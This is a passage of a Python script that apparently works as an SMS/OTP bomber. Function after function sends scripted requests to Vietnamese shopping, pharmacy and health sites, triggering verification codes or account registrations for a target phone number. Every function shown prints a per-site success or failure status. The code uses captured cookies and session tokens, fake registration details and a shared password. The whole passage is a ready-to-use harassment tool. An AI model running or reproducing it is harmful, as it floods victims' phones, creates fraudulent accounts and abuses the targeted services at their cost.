        'affiliate_content': '%7B%22time_stamp%22%3A1723354726%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_Search_COM_STA_GP_TVN_01062024_EXACTKEWORDS%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Ftat-vo-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.90.220.68%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221332724879-163056499676-v%5Cu1edb%20tay%20nam%22%2C%22utm_content%22%3A%22700923935895%22%2C%22gclid%22%3A%22Cj0KCQjwn9y1BhC2ARIsAG5IY-4LLvEnGTTKvC3t-KJumETp2sBDpntabX_CQTDiWbXdbv6xHHkYirIaAlkwEALw_wcB%22%7D',
        'XSRF-TOKEN': 'eyJpdiI6Imw2M1NyN0tWK1NFVWRucUVpRTJOSnc9PSIsInZhbHVlIjoiOWxqYXgrQ0tHK2R4VWtudHZuUzM4bkd1Z1c1TEl4bk1LRDFESlwvTHJRWVdqaFRQXC9jMjlLODA5MzJtcnBrdzMxIiwibWFjIjoiYmI5ZTk4OWFkMmFhZDk3NjhjMzk0N2E5MzhlZDZmMGJjOTE4MTc4MjIwMzZiMjVjMDg1NTllZGVlMzYzYjkxOSJ9',
        'laravel_session': 'eyJpdiI6Ik96RXlhV1JMVGEzT1E0T0ZCSk05VEE9PSIsInZhbHVlIjoiVWVrdXhaVTI5K3Rlam9SQ1Y4QzhCTEIyRnNcL2xjcmh1Y1dHd0NNOEw5VjR3dzNiNnVaQUl4TlwvcStDOUtwOHVDIiwibWFjIjoiOGMyNWU3ZDBlZTQ1NzdjOGFlZGU4OGZjMjUzNzE1Yzc0OGE4OTg1Y2RhNjEyOTZhMWE2ZmNlZmE4ZDM3OWI2MiJ9',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        # 'cookie': 'device_token=597f946e29e835d88f56392f40ea75c3; box_token=9dbb29f1bd9e93ef4a5f8468ff0b5618; cart_quantity=0; active-voucher1=true; g_state={"i_p":1725246086128,"i_l":4}; affiliate_content=%7B%22time_stamp%22%3A1723354726%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_Search_COM_STA_GP_TVN_01062024_EXACTKEWORDS%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Ftat-vo-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.90.220.68%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221332724879-163056499676-v%5Cu1edb%20tay%20nam%22%2C%22utm_content%22%3A%22700923935895%22%2C%22gclid%22%3A%22Cj0KCQjwn9y1BhC2ARIsAG5IY-4LLvEnGTTKvC3t-KJumETp2sBDpntabX_CQTDiWbXdbv6xHHkYirIaAlkwEALw_wcB%22%7D; XSRF-TOKEN=eyJpdiI6Imw2M1NyN0tWK1NFVWRucUVpRTJOSnc9PSIsInZhbHVlIjoiOWxqYXgrQ0tHK2R4VWtudHZuUzM4bkd1Z1c1TEl4bk1LRDFESlwvTHJRWVdqaFRQXC9jMjlLODA5MzJtcnBrdzMxIiwibWFjIjoiYmI5ZTk4OWFkMmFhZDk3NjhjMzk0N2E5MzhlZDZmMGJjOTE4MTc4MjIwMzZiMjVjMDg1NTllZGVlMzYzYjkxOSJ9; laravel_session=eyJpdiI6Ik96RXlhV1JMVGEzT1E0T0ZCSk05VEE9PSIsInZhbHVlIjoiVWVrdXhaVTI5K3Rlam9SQ1Y4QzhCTEIyRnNcL2xjcmh1Y1dHd0NNOEw5VjR3dzNiNnVaQUl4TlwvcStDOUtwOHVDIiwibWFjIjoiOGMyNWU3ZDBlZTQ1NzdjOGFlZGU4OGZjMjUzNzE1Yzc0OGE4OTg1Y2RhNjEyOTZhMWE2ZmNlZmE4ZDM3OWI2MiJ9',
        'origin': 'https://www.coolmate.me',
        'priority': 'u=1, i',
        'referer': 'https://www.coolmate.me/collection/combo-set-do-gia-tot?itm_source=homepage&itm_medium=herobanner_1&itm_campaign=Sale_giua_thang_15_8_-_Destop_-_fix_3&itm_content=/image/August2024/Sale_giua_thang_15_8_-_Destop_-_fix_3.jpg',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-csrf-token': 'rIG6136gGu756xPVgVVrXfLhxZUjZjmatPQ1iU7u',
    }

    json_data = {
        'fullname': 'tran quoc huuh',
        'email': 'soeasyvn1336@gmail.com',
        'phone': sdt,
        'password': '123123aA@',
        'ajax': True,
    }

    try:
        response = requests.post('https://www.coolmate.me/account/register', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("COOLMATE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("COOLMATE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mioto():
    cookies = {
        '_vid': 'Eiw8L9Ir5m56SIn0',
        '_hv': '5d629960ddf467c1d7a29afc5d3a3c1436b2c9b1680d1239025b45d43aabf046',
        '_mid': 'ul2e3a.Uj8WZEQYS_JNWRrU-iopyXPAY6FobQnefvd7bOpylODI9N-3P1zD-Nd9uVzbU8Pd1l0b4sqwdsAuaJwh8IMR7Q',
        '_hs': '9d68724d1934e72230e831e5c1b302f3a6210c4b25f158a4f1a111bed851b7e8',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        # 'cookie': '_vid=Eiw8L9Ir5m56SIn0; _hv=5d629960ddf467c1d7a29afc5d3a3c1436b2c9b1680d1239025b45d43aabf046; _mid=ul2e3a.Uj8WZEQYS_JNWRrU-iopyXPAY6FobQnefvd7bOpylODI9N-3P1zD-Nd9uVzbU8Pd1l0b4sqwdsAuaJwh8IMR7Q; _hs=9d68724d1934e72230e831e5c1b302f3a6210c4b25f158a4f1a111bed851b7e8',
        'origin': 'https://www.mioto.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.mioto.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'phone': sdt,
        'action': '1',
        'otpBy': '0',
    }

    try:
        response = requests.post('https://accounts.mioto.vn/mapi/phone/otp/gen', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MIOTO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MIOTO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def avakids():
    cookies = {
        'TBMCookie_3209819802479625248': '913589001721792014a7Mg2hhHa7pbVh+oCTfpJpA1Sks=',
        '___utmvm': '###########',
        '.AspNetCore.Antiforgery.Igz9_hL99hw': 'CfDJ8KCJ5TMsrhBIolL3aLeC8tgUGuuieZHIZ2cXAzdXCV0weIQMKIdaXaKHqWlFAxVrE5Mmx7MjY4DHsH057lcX75hawBGh2AFjqWR5v0sbzcTEpe213M95jEGw6a_EOBoGklFNPeg8y-tDvm0YJ2HFwq8',
        'CookiesUserId': 'f717fb39-aca2-447e-86d8-43353b354242',
        'MWG_CART_ID': 'e73eec56f3bc43c59790',
        'MWG_CART_HAVE_PRODUCT': '',
        'MWG_PRODUCT_BASIC_DB': 'm0PtwM5f7zfBNFFqjl2heNWXVnT5cDCxQupf6Di11B_JfPHbQCuwFQ--',
        'MWG_CART_SS_17': 'CfDJ8MR0DtoU1ltDp5DLN27lzqZ4YhPTRmbBDljODDlEJnUlV%2Bee2hGsJqDZO95ajUvteyCwhjJP5FqrwOBLYdppxI1k%2BvbqLYuJqF62Njl7iXdv%2FRsd8qq0AaBMkJsEnw9pRCgyeA16UEog6AShjid8R4ag1QxbIiNtqzkOaRXKukbC',
        'X-CSRF-TOKEN-MwgCart17': 'CfDJ8MR0DtoU1ltDp5DLN27lzqaRiOuypmIDAgn58TM-0T-pk1i5_VodJPnd_mdrIBLnjHCBZswioCNqDgvvdawVVAaU011jYh0_Aur2wMBODvZJ_FbFhM3Jp5a91Pjw5cQCd9JokvXAR-lGVygSJJGFa3k',
        'SvID': 'blki218|ZqB2J|ZqB2E',
        'DMX_Personal': '%7B%22UID%22%3A%22DMX%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
        'mwgngxpv': '3',
        'BONUSCART_CK': 'IoHfQ0np2zMfLJWaplKPR%2FdZVOKMK3Na4qz7P4lNgFPPpBjWeGmR9dYYMle3cbcHwmpI9sqRBZwtPWHomp7phw--',
        '.AspNetCore.Antiforgery.dGH04W8MKvk': 'CfDJ8LNt9duCvo5JgR90L8go8A6MNFRuMLytIZWVy85L0q2oLN1xh4JosZKHzuAuZ8EGmvSLazpfZMG9yIOdNtCbLLMJUI1gS9Toaz9Eu2PuYCaiiNZtT_jy4EPlOsYNyS7SalhePWKxBZTjqaqdbfVAZcE',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'TBMCookie_3209819802479625248=913589001721792014a7Mg2hhHa7pbVh+oCTfpJpA1Sks=; ___utmvm=###########; .AspNetCore.Antiforgery.Igz9_hL99hw=CfDJ8KCJ5TMsrhBIolL3aLeC8tgUGuuieZHIZ2cXAzdXCV0weIQMKIdaXaKHqWlFAxVrE5Mmx7MjY4DHsH057lcX75hawBGh2AFjqWR5v0sbzcTEpe213M95jEGw6a_EOBoGklFNPeg8y-tDvm0YJ2HFwq8; CookiesUserId=f717fb39-aca2-447e-86d8-43353b354242; MWG_CART_ID=e73eec56f3bc43c59790; MWG_CART_HAVE_PRODUCT=; MWG_PRODUCT_BASIC_DB=m0PtwM5f7zfBNFFqjl2heNWXVnT5cDCxQupf6Di11B_JfPHbQCuwFQ--; MWG_CART_SS_17=CfDJ8MR0DtoU1ltDp5DLN27lzqZ4YhPTRmbBDljODDlEJnUlV%2Bee2hGsJqDZO95ajUvteyCwhjJP5FqrwOBLYdppxI1k%2BvbqLYuJqF62Njl7iXdv%2FRsd8qq0AaBMkJsEnw9pRCgyeA16UEog6AShjid8R4ag1QxbIiNtqzkOaRXKukbC; X-CSRF-TOKEN-MwgCart17=CfDJ8MR0DtoU1ltDp5DLN27lzqaRiOuypmIDAgn58TM-0T-pk1i5_VodJPnd_mdrIBLnjHCBZswioCNqDgvvdawVVAaU011jYh0_Aur2wMBODvZJ_FbFhM3Jp5a91Pjw5cQCd9JokvXAR-lGVygSJJGFa3k; SvID=blki218|ZqB2J|ZqB2E; DMX_Personal=%7B%22UID%22%3A%22DMX%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; mwgngxpv=3; BONUSCART_CK=IoHfQ0np2zMfLJWaplKPR%2FdZVOKMK3Na4qz7P4lNgFPPpBjWeGmR9dYYMle3cbcHwmpI9sqRBZwtPWHomp7phw--; .AspNetCore.Antiforgery.dGH04W8MKvk=CfDJ8LNt9duCvo5JgR90L8go8A6MNFRuMLytIZWVy85L0q2oLN1xh4JosZKHzuAuZ8EGmvSLazpfZMG9yIOdNtCbLLMJUI1gS9Toaz9Eu2PuYCaiiNZtT_jy4EPlOsYNyS7SalhePWKxBZTjqaqdbfVAZcE',
        'Origin': 'https://www.avakids.com',
        'Referer': 'https://www.avakids.com/lich-su-mua-hang/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phoneNumber': sdt,
        'isReSend': 'false',
        'sendOTPType': '1',
        '__RequestVerificationToken': 'CfDJ8LNt9duCvo5JgR90L8go8A4qec6je7UJneAEXpEnc1-pqL-ZhM0205u4tpJk_DIjUdFs6h3cKTmiajRZTuKWWa10Jc_6AaKkwS6nVuOhbRpi7x89B9Bqxn78GuIW1vTEVRF-pJchKrCm2KbNOqG_1Bs',
    }

    try:
        response = requests.post(
            'https://www.avakids.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("AVAKIDS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("AVAKIDS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def giathuoctot():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://giathuoctot.com',
        'priority': 'u=1, i',
        'referer': 'https://giathuoctot.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNo': sdt,
    }

    try:
        response = requests.post('https://api.giathuoctot.com/user/otp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GIATHUOCTOT | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GIATHUOCTOT | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def medigozl():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'priority': 'u=1, i',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'from': 'ZALO',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://auth.medigoapp.com/prod/getOtp', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDIGOZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEDIGOZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pharmartzl():
    cookies = {
        'bppsession2021': 'ms0ocs045k27kqmte9sddlq122054ifo',
        'isAT': '0',
        'viteexConfig': '%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D',
        'mp_sid': '1721792970118.5579',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'bppsession2021=ms0ocs045k27kqmte9sddlq122054ifo; isAT=0; viteexConfig=%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D; mp_sid=1721792970118.5579',
        'origin': 'https://www.pharmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.pharmart.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'type': 'zalo',
    }

    try:
        response = requests.post('https://www.pharmart.vn/send-otp', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PHARMARTZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PHARMARTZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pharmartsms():
    cookies = {
        'bppsession2021': 'ms0ocs045k27kqmte9sddlq122054ifo',
        'isAT': '0',
        'viteexConfig': '%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D',
        'mp_sid': '1721792970118.5579',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'bppsession2021=ms0ocs045k27kqmte9sddlq122054ifo; isAT=0; viteexConfig=%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D; mp_sid=1721792970118.5579',
        'origin': 'https://www.pharmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.pharmart.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'type': 'sms',
    }

    try:
        response = requests.post('https://www.pharmart.vn/send-otp', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PHARMARTSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PHARMARTSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def medigosms():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'priority': 'u=1, i',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://auth.medigoapp.com/prod/getOtp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDIGOSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEDIGOSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def jiohealth():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app-location': 'VN',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://pharmacy.jiohealth.com',
        'priority': 'u=1, i',
        'referer': 'https://pharmacy.jiohealth.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'userID': '1647648',
        'token': '3ca29173-07f7-48c1-ad0f-68f1a460fb38',
        'phoneNumber': sdt,
        'phoneCountryID': '6',
        'loginAccountTypeID': '0',
        'isChangePhone': '0',
    }

    data = '{}'

    try:
        response = requests.post(
            'https://prod.jiohealth.com:8443/JioPharmacy/rest/jio/sendSMSPhoneVerification',
            params=params,
            headers=headers,
            data=data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("JIOHEALTH | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("JIOHEALTH | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ddmevabereg():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://dinhduongmevabe.com.vn',
        'Referer': 'https://dinhduongmevabe.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'userType': 'BabySitter',
        'provinceId': 1,
        'password': '123123aA@',
        'fullName': 'kcoo ten',
        'authenticationMode': 'Internal',
        'socialUserId': '',
        'socialToken': '',
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://api.dinhduongmevabe.com.vn/api/User/Register', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("DDMEVABE REG | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DDMEVABE REG | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ddmevabe():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Origin': 'https://dinhduongmevabe.com.vn',
        'Referer': 'https://dinhduongmevabe.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'userName': sdt,
    }

    try:
        response = requests.post('https://api.dinhduongmevabe.com.vn/api/User/GetVerifyPhoneNumberCode', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("DDMEVABE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DDMEVABE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def nhathuocankhang():
    cookies = {
        '___utmvm': '###########',
        '.AspNetCore.Antiforgery.PgYZnA9bRvk': 'CfDJ8MYaQjD04aBHj9meZl7eRqI3A2HboqNnhlow3nIbtSN1KebuCGK6Cc6IuNcfibOGjCM8Fz5YBSZbkIvW3ggg0LhTlWWOaTsLCwIM_9Zd3fdeEQuEjuLde5-WANEX1rQLaVVWdWxnFBWUqvXyCPq9PL8',
